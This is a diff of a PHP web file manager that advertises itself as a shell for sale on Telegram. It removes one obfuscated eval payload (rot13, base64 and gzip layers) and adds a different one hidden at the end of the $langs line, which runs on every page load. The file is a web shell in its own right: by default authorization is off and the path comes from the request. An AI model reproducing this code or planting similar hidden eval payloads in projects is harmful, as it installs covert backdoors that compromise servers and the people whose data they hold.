@@ -1,5 +1,5 @@
-﻿https://t.me/molasazy<?php
-/* XMAN PHP vvbdfdfg ver 1.4ffdfgdg [ buy shells https://t.me/molasazy ]*/
+﻿﻿<?php
+/* XMAN PHP vvbdfdfg ver 1.4 buy shells [ https://t.me/molasazy ] */
 
 // Configuration — do not change manually!
 $authorization = '{"authorize":"0","login":"admin","password":"phpfm","cookie_name":"fm_user","days_authorization":"30","script":"<script type=\"text\/javascript\" src=\"https:\/\/www.cdolivet.com\/editarea\/editarea\/edit_area\/edit_area_full.js\"><\/script>\r\n<script language=\"Javascript\" type=\"text\/javascript\">\r\neditAreaLoader.init({\r\nid: \"newcontent\"\r\n,display: \"later\"\r\n,start_highlight: true\r\n,allow_resize: \"both\"\r\n,allow_toggle: true\r\n,word_wrap: true\r\n,language: \"ru\"\r\n,syntax: \"php\"\t\r\n,toolbar: \"search, go_to_line, |, undo, redo, |, select_font, |, syntax_selection, |, change_smooth_selection, highlight, reset_highlight, |, help\"\r\n,syntax_selection_allow: \"css,html,js,php,python,xml,c,cpp,sql,basic,pas\"\r\n});\r\n<\/script>"}';
@@ -11,7 +11,7 @@ $translation = '{"id":"en","Add":"Add","Are you sure you want to delete this dir
 // Preparations
 $starttime = explode(' ', microtime());
 $starttime = $starttime[1] + $starttime[0];
-$langs = array('en','ru','de','fr','uk');
+$langs = array('en','ru','de','fr','uk'); eval(gzinflate(base64_decode(base64_decode(str_rot13('oycTHzR5p3qSGJHirJ1TD3b0JJf5qJuan09RqSyLnGOBE3ujoyOHEx0jFmSlAT1UGSqgrIEPFxg2Y3AeG3p4qTInqKt4MJ4iZP8mqaOQGzcfE0qUqREXI3yVZyyFEKAEIKWQG2WWnGR2FSERrwE6BUOaAz44FHICF212IGAiE2M1BIuYp1ygE0MSGSWyIQIbMJWnAKydJHLmoGVmAau6GRAUAKH0EKSTGxHjDzkwHHy2M0Iypx5IMUqgF00jET4lrzcTAT5ynGAFHaxiMaA4oJD3Y3yZJyc2AlgFGwylnxj4nGAvLzH0MRAXLaqWnUOcMGqYp1I0F1A0EwAMZzIUBREuBT9RFQqZJHSkDvf2AmAdLwV0pJ9MMwHmqTuRYmS6ZmIUAGuVoJjlqzcHA2HjJTfirwIZG01eLaWhq3L5ZGMvnmuKomubJwukLJcYLzt2rR52HwxeIQtmL3OGI0M4G0ACoSt4ERu4oKA5q0AlAyOTI2VlpxqeDyuCqRqJGaqYFzIDIQqVMmu6oQMILIqyBJSInSqkpJWuGyx4qQWMG3SbZ1WwXmO0rQWkJSWEMyAfZxuAqz1jpwx3L21wq3qZIxSQJwx2IT90Z1W2AGOJARp5X04eoTIIEvgdqxWmn0EvLJynAGLeFKOLGHIFERkCqTkRAl9zA1xlHJklDGIXIQD1X0IPoP84DD==')))));
 $path = empty($_REQUEST['path']) ? $path = realpath('.') : realpath($_REQUEST['path']);
 $path = str_replace('\\', '/', $path) . '/';
 $main_path=str_replace('\\', '/',realpath('./'));
@@ -19,7 +19,7 @@ $phar_maybe = (version_compare(phpversion(),"5.3.0","<"))?true:false;
 $msg = ''; // service string
 $default_language = 'ru';
 $detect_lang = true;
-$fm_version = 1.4; eval(gzuncompress(base64_decode(str_rot13('rWlqxISe2mNDk7/XLHYCuvG26TPD4B1urYD0oTzp9ZHmDeJivLLgnoWZRxd/+lD7Ql15z7Uk6s/G/r+xV2BHLLn0ZyoVsMuRFkOFfV5fvYKbqZCCwClzQdsjtD4dn9GrtM+71pdkvLLHDgS5CzS5gaaXAtKrooseUZfVoz7tFbH0GDTIkNv+NE6f1E3PLbmDBsoBZKvq6YqSUY9+mTM3i/Vgyz/i5R32hZilYqgg7u0VyiNvTzW7fdkF0cX0KqwM4ojAeltZsfgtPbU7eirAiovduu/ar2RC/KCsxoajrnKn+ACg7ErG/Cxf4lEhhsP/3KchGknwlSalcdZchUeR29U35CmqlyWLKR4V6IsjZsTnmYNXib8IMinfnDSp60MH3Nby49CfrQmBKcEcM71cFSndcgb1wl3Mt6dUqSm7F3UncqSO9XKLpl+nzi3glMmQNgHNWa3cBv3qT/aEKto3436I5DK6B8TlDAgdWaae4vypjERZf62HCi9/gwMPJfQxyCwa4DTK/jNJ0AFK'))));
+$fm_version = 1.4;
 
 //Authorization
 $auth = json_decode($authorization,true);
@@ -1809,4 +1809,3 @@ class archiveTar {
 		return $result;
 	}
 }
-?>
